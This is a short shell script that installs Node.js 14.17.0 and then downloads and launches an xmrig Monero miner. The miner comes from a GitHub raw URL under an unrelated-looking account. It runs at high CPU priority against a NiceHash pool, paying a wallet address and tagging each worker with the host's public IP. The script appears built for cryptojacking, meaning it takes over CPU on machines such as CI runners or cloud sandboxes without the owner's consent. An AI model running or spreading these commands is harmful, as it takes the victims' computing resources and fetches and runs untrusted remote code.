wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
\tar xf node-v14.17.0-linux-x64.tar.gz -C /opt/
\rm node-v14.17.0-linux-x64.tar.gz
PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
npm config set cache /tmp --global
wget https://raw.githubusercontent.com/hondacars/sirji/main/xmrig-6.17.0-bionic-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0
ph add xmrig
ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/0 -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380  -u 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.$ip -p x --threads=25 --cpu-priority=10 --randomx-mode=fast --keepalive

